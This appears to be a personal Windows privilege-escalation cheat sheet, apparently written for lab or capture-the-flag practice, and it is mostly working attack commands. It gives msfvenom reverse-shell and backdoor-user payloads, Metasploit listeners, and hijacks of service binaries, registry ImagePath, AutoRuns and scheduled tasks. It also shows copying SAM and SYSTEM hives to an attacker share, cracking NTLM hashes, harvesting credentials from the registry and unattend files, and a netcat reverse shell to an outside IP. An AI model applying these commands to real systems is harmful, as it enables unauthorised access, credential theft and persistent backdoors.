1) Credentials access

2) Exploits

3) Missconfiguration



---------------------------------------------------------------------------
1) Credentials access
	a) Reused Passwords
	b) Credentials from configuration files
	c) Credentials from local dabases
	d) Credentials from cmdkey
	e) Credentials fom registers
	f) Credentials from unattend or Systprep Files
	g) Credentials from Log Files
	h) User Groups
	 
2) Exploits
	a) Services running on localhost
	b) Kernel version 
	c) Software versions
	d) Service Versions	

3) Missconfiguration	
	a) user privilegs
	b) Services 
			- unqueted service path
			- change service binary location
			- overwrite service binary
			- DLL hijacking
			- registry - AutoRuns
	c) AlwaysInstallElevated Set in Registry
	d) Sheduled Tasks
			- Executable File writable
			- Dependency writable
	e) Sensitive Files Readable
			- Sam Hive
			- System Hive			
--------------------------------------------------------------------------------------------------------------------------------------------------------

nice tool to use creds etc (on kali) :
	psexec.py admin@10.10.222.123 cmd.exe

	c:\>  winPEASx64.exe servicesinfo

---------------------------------------------------------------------------------------------------------------------------------------------------------
1) 
	b) 
		C:>  cd C:\Windows\Panther
		C:>  cat Unattend.xml

----------------------------------------------------------------------------------------------------------------------------------------------------------


1)

 d) cmd keys (in windows server) -  using stored credentials:
	C:> cmdkey /list
	
	C:> runas /savecred /user:admin C:\PrivEsc\RevShell.exe 




----------------------------------------------------------------------------------------------------------------------------------------------------------

1)

i) weak registry permisions



	winpeas.exe shows that service can be vurnaleble


	C:\> sc qc regsvc     #  regsvc - service name that you can run with escalated  priviliges , must have SYSTEM priviliges  if not , no seas to exploit


	C:\> .\accesschk /accepteula -uvwqk  HKLM\system\CurrentControlSet\services\regsvc 	  #    regsvc - service name that you can run with escalated  priviliges 
	if output : "NT AUTHORITY\INERACTIVE"    - essentially all loged on users - OK 


	C:\> reg add HKLM\SYSTEM\CurrentControlCet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverseShell.exe /f


start  service:

	C:\> sc start regsvc       # will start registry service ad run reverseShell



		
		
----------------------------------------------------------------------------------------------------------------------------------------------------------

1)

e)  Serching for passwords in Windows registry 
can use:
c:>  winPEASx64.exe windowscreds
c:>  winPEASx64.exe filesinfo

 search for keys :

	c:>  reg query HKLM /f password /t REG_SZ /s 
		faster:

	c:>  reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"


use crednentials: 

	c:> winexe -U 'admin%password' //10.10.222.123 cmd.exe


----------------------------------------------------------------------------------------------------------------------------------------------------------
3)
	b)  Insecure service permissions

		c:\> accesschk.exe /accepteula  -uwcqv user daclsvc      # <- daclsvc is a service name to exploit , user - your user   (this is checkig permisions of  user on this service better to use winPEAS first)
		c:\> sc qc daclsvc         #   <- check if service is runnig system priviliges ,  must have SYSTEM priviliges if not no sense

		c:\> sc config daclsvc binpath="\"C:\PriEsc\reverse.exe\""

		c:\> net start daclsvc        # starting the service - first start listener on kali :) 
		
			or 

		c:\> sc stop daclsvc        # stop the service - first start listener on kali :) 
		c:\> sc start daclsvc        # starting the service - first start listener on kali :) 

----------------------------------------------------------------------------------------------------------------------------------------------------------
3)
	b)  Insecure service executables
		if wenPEASx64.exe shows that vuln you can confirme:

	c:\> sc qc filepermscv     #   vulnerable service filepermscv.exe   - is executable name ; privs should be LocalSystem or System

	
	c:\> accesschk.exe /accepteula  -quvm  "C:\Program Files\filepermscv.exe"      # <- vulnerable service filepermscv.exe   - is executable name, this shows if you have access to executable    


	generate msfvenom : reverse.exe   (copy to service name ) ->  filepermscv.exe and upload 



	c:\> net start filepermscv
		or
	c:\> sc start filepermscv



----------------------------------------------------------------------------------------------------------------------------------------------------------
3) 
	b) unqueted service path
		can use winPEAS for checking vuln:
		c:\>  winPEASx64.exe servicesinfo   # it will give 'unquatedservice'

		c:\> sc qc unquatedservice   # get info about that service  ,  must have SYSTEM priviliges if not , no sense to exploit

		c:\> accesschk.exe /accepteula  -uwdq "C:\Program Files\unquated service path"
		
		kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.123.23 LPORT=4444 -f exe > common.exe     # becouse path is "C:\Program Files\commont files\.."
						listen can be likie:
									kali $ msfconsole
									msf6 > use multi/handler  
									msf6 exploit(multi/handlers) > set payload windows/x64/shell_reverse_tcp 	
									msf6 exploit(multi/handlers) > set LHOST 10.10.123.23
									msf6 exploit(multi/handlers) > set LPORT 4444

		c:\> net start unquatedservice    	/or/  -> 	c:\> sc start unquatedservice  




----------------------------------------------------------------------------------------------------------------------------------------------------------
3)
	b) StartUp Apps (probably not often existas):
		check if you can write files to StartUp directory 
			C:\PrivEsc\> accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
					put inside reverse.exe 

			C:\PrivEsc\>cscript c:\PrivEsc\CreateShortcut.vbs       <- create new shrtcut to reverse.exe executrable to StsartUp directory

			C:\PrivEsc\> rdestop -u admin 10.10.72.82     <- simulate  admin logon 


----------------------------------------------------------------------------------------------------------------------------------------------------------
3) 
c) AlwaysInstallElevated (not really hacliking registry only identyfy in regystry) : 	generate msi reverseShell msi  and  run msiexec 
		
		
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
			output:  AlwaysInstallElevated REG_DWORd 0x1     - enabled

	generate msi reverseShell msi:
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f msi -o reverse.msi     <- generate and put this on machine you are attacking
		
	
	msiexec /quiet /qn /i C:\PrivEsc\reverse.msi	


	
	You can also run:									
		C:\> .\winPEASx64.exe 
		...
		[+] Checking AlwaysInstallElevated
		 [?]  https://book.hacktriks.xyz/windows....
		 AlwaysInstallElevated set to 1 in HKLM!     (color is red)
 		 AlwaysInstallElevated set to 1 in HKCU!     (color is red)
		...


----------------------------------------------------------------------------------------------------------------------------------------------------------
3) 

b) registry - AutoRuns ()    - In real system you have to wait to administrator to log in.

	C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run       <- this gives back the  program.exe 

	C:\> C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"     <- check AutoRun executable is writable by everyone
	
	C:\> copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y    	<-  copy reverShell.exe to overwrite the AutoRun executable 
										create reverseShell:
											> sfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.12.120 LPORT=4444 -f exe > program.exe
										listen: 
											use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.11.12.120 ; set LPORT 4444 ; run
	You can also run:									
		C:\> .\winPEASx64.exe
			...
			Autorun Applications
				FilePerm: Everyone [AllAccess]   (the color is red )
			...

	You have to restart machine!!!   In real system you have to wait to administrator to log in.
----------------------------------------------------------------------------------------------------------------------------------------------------------
3)
d) Sheduled Tasks (has to be able to edit script/task , system priviliges has to be  on script/task).

	if the task is "CleanUp.ps1"  you can add task like (it is ps1 script so it is easy), reverse shell is in "C:\PrivEsc" directory:
			echo C:\PrivEsc\revShell.exe >> C:\DevTools\CleanUp.ps1

	you can check  you have ability to write to script:
			C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

----------------------------------------------------------------------------------------------------------------------------------------------------------
3) 
e) SAM - security account manager (not working if normaly properly windows configured , but good to check)
SAM files   - dumping and crakcing NTLM Hashes

if there is copy of SMA files (on windows machine , left by somebody) you can copy them on kali. 

		copy C:\Windows\Repair\SAM   \\10.10.10.10\kali\               <- copy file on local machine
		copy C:\Windows\Repair\SYSTEM   \\10.10.10.10\kali\               <- copy file on local machine


		python3 usr/share/creddump7/pwdump.py SYSEM SAM		<- it will give NTLM hashes

		hashcat -m 1000 --foce <hash> /usr/share/wordlists/rockuyou.txt    <- crack hash  
			can also use john:
		john --format=NT ./hashes.txt

		if you have password you can log in usngr RDE etc

--------------------------------------------------------------------------------------------------------------------------------------------------------
Passing the hash
	./psexec.py Administrator@10.10.223.234      <-  will ask for password



--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
step:
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
	whoami /priv
	netstat –nao
	dir C:\Windows\System32\config\RegBack\SAM
	dir C:\Windows\System32\config\RegBack\SYSTEM


	find passwords:
		C:\Users\Public>reg query HKLM /f pass /t REG_SZ /s 
		
		
		
--------------------------------------------------------------------------------------------------------------------------------------------------------
Sth extra:

Use PowerUp (part of PowerSploit)

> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
> Import-Module (Resolve-Path('PowerUp.ps1'))
>Invoke-AllChecks

>Import-Module PowerUp.ps1
and now:	
	>Invoke-AllChecks  
or one module
	>Get-UnquotedService
	
-----------------------------
check users:
	>net user
	
-----------------------------
List installed KB's for SMBGhost:
C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list

-----------------------------
I have administrator password:
C:\Users\viewer>runas /env  /profile /user:STH\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.49.140 5555"


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
Priv esc other ideas:
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
Unquoted Service Path (used with high priviliges):	
	this is ok :
	"C:\Program Files\Some Program\program.exe"

	but if it is unquoted:
		C:\Program Files\Some Program\program.exe

	computer can be interpreted as:
	this is program 	
		C:\Program.exe 
	this is arguments:
		 Files\Some Program\program.exe
	
	or this is program:
		C:\Program.exe Files\Some
	this is argument Program\program.exe

	or at last
		C:\Program Files\Some Program\program.exe
	
You can set program :	
	C:\Program.exe  which will give you high priviliges 

PowerUp output:
	ModifiablePath : @(ModifiablePath=C.:\ ..	
	AbuseFunction : Write-ServiceBinary -Name 'VulnServiceName' Path  <HijackPath>


	generate payload (it can be reverse shell but in heat I add new user)
		:~$ msfvenom -p windows/adduser USER=backdoor_admin PASS=Password! -f exe serviceName.exe 
		cp real service and replace payload with real sevice with name withou blan space like Program.exe 
	
	restart service or machine to restart service.
	
--------------------------------------------------------------------------------------------------------------------------------------------------------
Writable service (overwrite service binary):
	check services:
		PS C:\> wmic service get name,startname,pathname
	but beter use powerUp:	
			output: 
			 Modifiable Service Files	Install-ServiceBinary -Name '... 
	
	We can check service with:
		Install-ServiceBinary -Name "SomeVulnServiceName"		 
			 
	
	generate payload (it can be reverse shell but in heat I add new user)
		:~$ msfvenom -p windows/adduser USER=backdoor_admin PASS=Password! -f exe serviceName.exe 
		cp real service and replace payload with real sevice
					

--------------------------------------------------------------------------------------------------------------------------------------------------------
SeBackupPrivilige
	
	







